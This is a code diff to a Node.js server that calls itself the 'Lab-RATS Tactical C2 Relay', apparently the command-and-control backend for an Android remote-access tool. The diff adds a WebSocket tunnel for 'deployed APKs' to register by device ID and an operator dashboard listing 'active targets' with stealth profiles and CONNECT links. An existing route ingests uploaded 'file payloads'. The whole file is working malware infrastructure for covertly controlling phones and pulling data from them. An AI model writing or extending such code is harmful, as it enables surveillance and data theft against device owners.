@@ -1,24 +1,52 @@
 const express = require('express');
+const { WebSocketServer } = require('ws');
+const http = require('http');
 const cors = require('cors');
-const path = require('path');
 
 const app = express();
+const server = http.createServer(app);
+const wss = new WebSocketServer({ server, path: '/tunnel' });
+
 const PORT = process.env.PORT || 10000;
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// In-memory telemetry and device registry
+// In-memory telemetry, device registry, and active WebSocket tunnels
 const devices = new Map();
+const socketConnections = new Map(); // deviceId -> ws socket
 const telemetryLogs = [];
+
+// WebSocket Tunnel Listener for deployed APKs
+wss.on('connection', (ws, req) => {
+    const urlParams = new URLSearchParams(req.url.split('?')[1]);
+    const deviceId = urlParams.get('deviceId') || 'unknown_device';
+
+    console.log(`[TUNNEL] WebSocket uplink established for device: ${deviceId}`);
+    socketConnections.set(deviceId, ws);
+
+    ws.on('message', (message) => {
+        try {
+            const data = JSON.parse(message.toString());
+            console.log(`[TUNNEL] Message from ${deviceId}:`, data.type);
+        } catch (e) {
+            console.error('[TUNNEL] Parse error:', e.message);
+        }
+    });
+
+    ws.on('close', () => {
+        console.log(`[TUNNEL] WebSocket uplink closed for device: ${deviceId}`);
+        socketConnections.delete(deviceId);
+    });
+});
 
 // Tactical C2 Operator Dashboard (HTML) at root URL
 app.get('/', (req, res) => {
     const deviceList = Array.from(devices.values());
 
     let devicesHtml = deviceList.length === 0 ?
-        '<tr><td colspan="7" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
+        '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
         deviceList.map(d => `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan);">${d.deviceId || 'N/A'}</td>
@@ -28,6 +56,7 @@ app.get('/', (req, res) => {
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.75rem; color: #aaa;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
+                <td><a href="http://${d.ip || '127.0.0.1'}:${d.port || '9191'}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
             </tr>
         `).join('');
 
@@ -75,7 +104,7 @@ app.get('/', (req, res) => {
         </div>
 
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span></div>
+            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span> &nbsp;|&nbsp; TUNNELS: <span style="color: var(--neon-green); font-weight: bold;">${socketConnections.size}</span></div>
             <button class="refresh-btn" onclick="location.reload()">REFRESH_DASHBOARD</button>
         </div>
 
@@ -92,6 +121,7 @@ app.get('/', (req, res) => {
                             <th>ENDPOINT IP:PORT</th>
                             <th>PROFILE</th>
                             <th>LAST CHECK-IN</th>
+                            <th>ACTION</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -132,6 +162,7 @@ app.get('/api/status', (req, res) => {
         service: 'Lab-RATS Tactical C2 Relay',
         version: '1.6.0',
         activeDevices: devices.size,
+        activeTunnels: socketConnections.size,
         timestamp: new Date().toISOString()
     });
 });
@@ -181,6 +212,6 @@ app.post('/upload', (req, res) => {
     res.json({ success: true, message: 'File payload ingested successfully' });
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+server.listen(PORT, '0.0.0.0', () => {
     console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
 });
